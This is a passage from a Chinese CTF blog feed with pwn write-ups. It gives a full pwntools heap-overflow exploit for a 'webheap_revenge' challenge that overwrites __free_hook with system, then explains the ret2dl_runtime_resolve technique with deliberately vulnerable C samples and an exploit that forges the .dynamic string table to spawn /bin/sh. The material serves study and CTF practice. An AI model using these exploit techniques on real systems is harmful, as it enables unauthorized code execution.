title="编辑chunk代码"></p><p>分析程序发现，在执行<code>edit功能</code>时，向<code>chunk</code>中写入的数据长度为用户输入的数据长度，而且程序没有对输入数据长度进行限制，所以我们可以随心所欲的向程序发送任意长度的数据，就是说程序存在<code>堆溢出</code>漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_head</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xb9\x05&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_mode</span>(<span class="hljs-params">mode</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x84&quot;</span>+p8(mode)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_index</span>(<span class="hljs-params">ind</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x80&quot;</span>+p8(ind)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_size</span>(<span class="hljs-params">size=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\x81&quot;</span>+p16(size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_data</span>(<span class="hljs-params">data=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;\xbd\x81&quot;</span>+p16(<span class="hljs-built_in">len</span>(data))+data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_end</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x80\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">payload</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;length: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">0</span>)+\<br>            make_index(ind)+\<br>            make_size(size)+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">1</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">2</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data()+\<br>            make_end()<br>    send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=make_head()+\<br>            make_mode(<span class="hljs-number">3</span>)+\<br>            make_index(ind)+\<br>            make_size()+\<br>            make_data(data)+\<br>            make_end()<br>    send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">att</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>p=process(<span class="hljs-string">&#x27;./webheap_revenge&#x27;</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x430</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x38</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x430</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0x41</span>)+p64(free_hook))<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x38</span>)<br>edit(<span class="hljs-number">4</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dl_resolve</title>
    <link href="/page/ret2dl_runtime_resolve/"/>
    <url>/page/ret2dl_runtime_resolve/</url>
    
    <content type="html"><![CDATA[<p>是利用elf文件的延迟绑定技术<code>_dl_runtime_resolve</code>，达到攻击目的的一种技术</p><p>程序在执行时，程序<code>link_map</code>结构体的地址位于<code>got表</code>的第二项，<code>_dl_runtime_resolve</code>函数地址位于<code>got表</code>的第三项</p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve.jpg" srcset="/img/loading.gif" lazyload alt="&quot;函数第一次调用前&quot;" title="函数第一次调用前"></p><p>在使用<code>_dl_runtime_resolve</code>导出函数时，会设置函数在<code>got表</code>中对应的项为函数真实地址</p><p>如果程序开启了<code>PIE</code>保护，那么会在加载程序的阶段，将<code>got表</code>中对应函数的真实地址填入</p><p><code>_dl_runtime_resolve</code> 在<code>sysdeps/架构/dl-trampoline.h</code>文件中，是一段汇编代码，通过栈传入两个参数，第一个参数是当前程序的<code>link_map结构体的地址</code>，第二个参数是函数在<code>.rel.plt表中的索引值</code>，函数首先保存寄存器的值，然后调用<code>_dl_fixup</code>函数，最后还原寄存器，并执行函数</p><p><code>_dl_fixup</code>在<code>elf/dl-runtime.c</code>文件中，传入两个参数,参数与<code>_dl_runtime_resolve</code>的参数相同，函数先通过<code>link_map</code>获取程序中各种段的地址，经过各种检测后，通过<code>_dl_lookup_symbol_x</code>从<code>link_map.l_scope</code>中搜索符号，并返回符号地址，再经过各种检测后，如果未开启绑定，就直接返回符号地址，否则执行<code>elf_machine_fixup_plt</code>函数，设置<code>got表</code>中的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 获取各种段的地址</span><br><span class="hljs-comment">    这些段的地址不是直接储存在 l_info中，而是储存在程序的 dynamic段中 */</span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">// 获取 dnysym 表地址</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br>    <span class="hljs-comment">// 获取 dnystr 表地址</span><br><span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 获取函数在 rel.plt 中对应成员的地址</span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>    <span class="hljs-comment">// 获取函数在 dynsym 中对应成员的地址</span><br><span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br><span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>    <span class="hljs-comment">// 获取函数在 got 中对应成员的地址</span><br><br><span class="hljs-comment">/* 调用_dl_lookup_symbol_x */</span><br>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// strtab+sym-&gt;st_name 获取符号名称</span><br><br><span class="hljs-comment">/* rel.plt结构体(函数重定向的信息)</span><br><span class="hljs-comment">Elf32_Rela</span><br><span class="hljs-comment">offset 指向GOT表的指针 4字节</span><br><span class="hljs-comment">info 关于导入符号的信息 4字节</span><br><span class="hljs-comment">当重定向函数时 info的第一个字节为 0x07</span><br><span class="hljs-comment">info&gt;&gt;8 为函数符号在.dnysym 中的下标</span><br><span class="hljs-comment">addend 浮动数值 4字节</span><br><span class="hljs-comment">通过 &amp;.dnysym[info]+addend 为表示函数的 .dnysym中的成员</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Elf64_Rela</span><br><span class="hljs-comment">offset 指向GOT表的指针 8字节</span><br><span class="hljs-comment">info 关于导入符号的信息 8字节</span><br><span class="hljs-comment">当重定向函数时 info的 前4字节 为 0x07</span><br><span class="hljs-comment">info的后4字节为函数符号在 .dnysym 中的下标</span><br><span class="hljs-comment">addend 浮动数值 8字节</span><br><span class="hljs-comment">通过 &amp;.dnysym[info]+addend 为表示函数的 .dnysym中的成员</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* dynsym结构体 </span><br><span class="hljs-comment">Elf32_Sym</span><br><span class="hljs-comment">name 对于.dnystr 的偏移 4字节</span><br><span class="hljs-comment">value 4字节</span><br><span class="hljs-comment">如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL</span><br><span class="hljs-comment">当成员是用来描述函数时 value为0</span><br><span class="hljs-comment">size 4字节</span><br><span class="hljs-comment">符号大小</span><br><span class="hljs-comment">当成员是用来描述函数时 size为0</span><br><span class="hljs-comment">info 符号的信息 1字节</span><br><span class="hljs-comment">当成员是用来描述函数时 info为0x12</span><br><span class="hljs-comment">other 1字节</span><br><span class="hljs-comment">当成员是用来描述函数时 other为0</span><br><span class="hljs-comment">shndx 2字节</span><br><span class="hljs-comment">绑定section的索引号</span><br><span class="hljs-comment">当成员是用来描述函数时 shndx 为0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Elf64_Sym</span><br><span class="hljs-comment">name 对于.dnystr的偏移 4字节</span><br><span class="hljs-comment">info 符号的信息 1字节</span><br><span class="hljs-comment">当成员是用来描述函数时 info为0x12</span><br><span class="hljs-comment">other 显示形式 1字节</span><br><span class="hljs-comment">描述函数时 other为0</span><br><span class="hljs-comment">shndx 绑定的section的索引号 2字节</span><br><span class="hljs-comment">描述函数时 shndx 为0</span><br><span class="hljs-comment">value 8字节</span><br><span class="hljs-comment">如果这个符号被导出，则存有这个导出函数的got地址-8，否则为NULL</span><br><span class="hljs-comment">当成员是用来描述函数时 value为0</span><br><span class="hljs-comment">size 8字节</span><br><span class="hljs-comment">符号大小</span><br><span class="hljs-comment">当成员是用来描述函数时 size为0</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* dynamic结构体</span><br><span class="hljs-comment">Elf32_Dyn</span><br><span class="hljs-comment">tag 指定结构用来描述的段类型  4字节</span><br><span class="hljs-comment">val/ptr  4字节</span><br><span class="hljs-comment">当用来描述某个段的地址时使用 ptr</span><br><span class="hljs-comment">其余情况使用val</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Elf64_Dyn</span><br><span class="hljs-comment">tag 指定结构用来描述的段类型  4字节</span><br><span class="hljs-comment">val/ptr 8字节</span><br><span class="hljs-comment">当用来描述某个段的地址时使用 ptr</span><br><span class="hljs-comment">其余情况使用val</span><br><span class="hljs-comment">tag可选值：</span><br><span class="hljs-comment">    #define DT_NULL 0              标记动态部分的结束</span><br><span class="hljs-comment">    #define DT_NEEDED 1            所需库的名称</span><br><span class="hljs-comment">    #define DT_PLTRELSZ 2          PLT 重定位的字节大小</span><br><span class="hljs-comment">    #define DT_PLTGOT 3            处理器定义的值</span><br><span class="hljs-comment">    #define DT_HASH 4              符号哈希表地址</span><br><span class="hljs-comment">    #define DT_STRTAB 5            字符串表地址</span><br><span class="hljs-comment">    #define DT_SYMTAB 6            符号表地址</span><br><span class="hljs-comment">    #define DT_RELA7               Rela relocs地址</span><br><span class="hljs-comment">    #define DT_RELASZ 8            Rela reloc 的总大小</span><br><span class="hljs-comment">    #define DT_RELAENT 9           一个 Rela reloc 的大小</span><br><span class="hljs-comment">    #define DT_STRSZ 10            字符串表的大小</span><br><span class="hljs-comment">    #define DT_SYMENT 11           一个符号表的大小入口</span><br><span class="hljs-comment">    #define DT_INIT 12             init 函数的地址</span><br><span class="hljs-comment">    #define DT_FINI 13             储存fini函数的指针地址(会在exit中执行)</span><br><span class="hljs-comment">    #define DT_SONAME 14           共享对象的名称</span><br><span class="hljs-comment">    #define DT_RPATH 15            库搜索路径（不推荐使用）</span><br><span class="hljs-comment">    #define DT_SYMBOLIC 16         从这里开始符号搜索</span><br><span class="hljs-comment">    #define DT_REL 17              Rel reloc 的地址</span><br><span class="hljs-comment">    #define DT_RELSZ 18            Rel reloc 的总大小</span><br><span class="hljs-comment">    #define DT_RELENT 19           一个 Rel reloc 的大小</span><br><span class="hljs-comment">    #define DT_PLTREL 20           PLT 中的 reloc 类型</span><br><span class="hljs-comment">    #define DT_DEBUG 21            用于调试；unspecified</span><br><span class="hljs-comment">    #define DT_TEXTREL 22          Reloc 可能会修改 .text</span><br><span class="hljs-comment">    #define DT_JMPREL 23           PLT relocs 的地址</span><br><span class="hljs-comment">    #define DT_BIND_NOW 24         对象的进程重定位</span><br><span class="hljs-comment">    #define DT_INIT_ARRAY 25       带有 init fct 地址的数组</span><br><span class="hljs-comment">    #define DT_FINI_ARRAY 26       带有 fini fct 地址的数组</span><br><span class="hljs-comment">    #define DT_INIT_ARRAYSZ 27     以字节为单位的大小DT_INIT_ARRAY</span><br><span class="hljs-comment">    #define DT_FINI_ARRAYSZ 28     DT_FINI_ARRAY 的字节大小</span><br><span class="hljs-comment">    #define DT_RUNPATH 29          库搜索路径</span><br><span class="hljs-comment">    #define DT_FLAGS 30            正在加载的对象的标志</span><br><span class="hljs-comment">    #define DT_ENCODING 32         编码开始range</span><br><span class="hljs-comment">    #define DT_PREINIT_ARRAY 32    带有 preinit fct 地址的数组</span><br><span class="hljs-comment">    #define DT_PREINIT_ARRAYSZ 33  DT_PREINIT_ARRAY 的字节大小</span><br><span class="hljs-comment">    #define DT_NUM 34              使用的数量</span><br><span class="hljs-comment">    #define DT_LOOS 0x6000000d     操作系统特定的开始</span><br><span class="hljs-comment">    #define DT_HIOS 0x6ffff000     操作系统特定的结束</span><br><span class="hljs-comment">    #define DT_LOPROC 0x70000000   处理器特定的开始</span><br><span class="hljs-comment">    #define DT_HIPROC 0x7fffffff   处理器特定的结束</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* dnystr段结构 </span><br><span class="hljs-comment">    开头第一个字节为\x00,后面储存的每个符号的名称，以\x00结尾</span><br><span class="hljs-comment">*/</span><br>    <br></code></pre></td></tr></table></figure><p><code>_dl_lookup_symbol_x</code>在<code>elf/dl-lookup.c</code>文件中，传入7个参数，分别是 <code>符号名称</code>，<code>link_map</code>，<code>符号在dnysym中对应成员的地址</code>，<code>link_map引用的符号表</code>(里面是保存了用于引用的<code>link_map结构体</code>信息)，<code>版本</code>，<code>符号类型</code>，<code>符号版本信息</code>，<code>跳过的link_map</code>(不查找这个文件中的符号) ，遍历<code>scope</code>中的结构体，排除跳过的<code>link_map</code>，使用 <code>do_lookup_x</code> 从剩余的<code>link_map</code>中搜索符号，当搜索到符号时，返回结构体<code>&#123;符号地址,当前link_map&#125;</code></p><p><code>do_lookup_x</code>在<code>elf/dl-lookup.c</code>文件中，传入13个参数，主要流程为，循环遍历当前<code>link_map</code>表示的文件及其引用的文件中的符号，通过遍历对比文件中的符号名称与传入<code>_dl_lookup_symbol_x</code>的符号名称，来搜索符号，当搜索到符号时，返回 <code>&#123;符号地址,符号所属link_map&#125;</code></p><h2 id="修改dynamic">修改dynamic</h2><blockquote><p>从 <code>_dl_fixup</code> 中的代码中可以看出，程序获取段地址，是通过<code>dynamic段</code>中储存的结构体获取的<br>原本<code>dynamic段</code>中<code>DT_STRTAB</code>的<code>ptr</code>字段储存的是 程序<code>dnystr段</code>的地址，程序在进行绑定操作时，会通过<code>dnystr段</code>获取符号名称<br>当我们将<code>dynamic段</code>中的<code>DT_STARTAB</code>的<code>ptr</code>字段储存的数据修改为我们伪造的<code>dnystr段</code>地址时，<br>程序在第一次调用库中的函数时，通过<code>_dl_runtime_resolve</code>的绑定操作，从我们伪造的<code>dnystr段</code>中获取符号名称，从库中导出对应的符号,并执行我们构造的函数<br>这种利用方法需要程序关闭了 <code>ROLRO保护</code>，否则<code>.dynamic</code> 段不可写，也就无法达到攻击的效果了</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> cache[<span class="hljs-number">0x30</span>]=&#123;&#125;;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> state=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">0x40</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,cache,<span class="hljs-number">0x50</span>);<br>    c[read(<span class="hljs-number">0</span>,c,<span class="hljs-number">0x10</span>)<span class="hljs-number">-1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *a=atoi(c);<br>    c[read(<span class="hljs-number">0</span>,c,<span class="hljs-number">0x10</span>)<span class="hljs-number">-1</span>]=<span class="hljs-number">0</span>;<br>    *a=atoi(c);<br>    <span class="hljs-built_in">exit</span>(state);<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc -z norelro -no-pie pwn_resolve.c -o pwn_resolve</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-1.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-2.jpg" srcset="/img/loading.gif" lazyload alt="bss段布局" title="bss段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-3.jpg" srcset="/img/loading.gif" lazyload alt="dynamic段布局" title="dynamic段布局"></p><p><img src="/img/blog_img/ret2dl_runtime_resolve/pwn-%E6%A0%88-resolve-4.jpg" srcset="/img/loading.gif" lazyload alt="dynstr段布局" title="dynstr段布局"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp思路</span><br><span class="hljs-string">    设置 dynamic段 中 dynstr段 的地址为  bss段 中构造的 &quot;\x00system\x00&quot; 字符串的地址</span><br><span class="hljs-string">    并设置 state 为 bss段 中构造的 &quot;/bin/sh&quot; 字符串的地址</span><br><span class="hljs-string">    在执行 exit 函数时 经过 _dl_runtime_resolve 就会搜索 system 函数并执行 system(&quot;/bin/sh&quot;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./pwn_resolve&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&quot;system\x00&quot;</span><br>payload=payload.ljust(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x4033c0</span>)<br>p.sendline(payload)<br>pause()<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4031e0</span>))<br>pause()<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4033c7</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="伪造reloc-offset">伪造reloc_offset</h2><blockquote><p>从<code>_dl_fixup</code>中的代码可以看出，程序获取与函数对应的<code>rel.plt表项</code> <code>reloc</code>是通过<code>reloc_offset</code>参数<br>获取对应的<code>dnysym表项</code> <code>sym</code>是通过<code>reloc.r_info</code> ，获取<code>dnystr</code>对应的名称是通过<code>sym</code><br>所以只要伪造了<code>reloc_offset</code> 参数，就可以伪造<code>reloc</code>，进而伪造 <code>sym</code> 与 <code>dnystr</code>中对应的名称<br>然后就会调用我们伪造的<code>dnystr</code>中的函数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 样例代码 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">char</span> cache[<span class="hljs-number">0x50</span>]=&#123;&#125;;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> state=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">0x40</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>,cache,<span class="hljs-number">0x70</span>);<br>    read(<span class="hljs-number">0</span>,c,<span class="hljs-number">0x70</span>);<br>&#125;<br><span class="hljs-comment">/*编译命令</span><br><span class="hljs-comment">    gcc -fno-stack-protector -no-pie pwn_resolve.c -o pwn_resolve</span><br><span 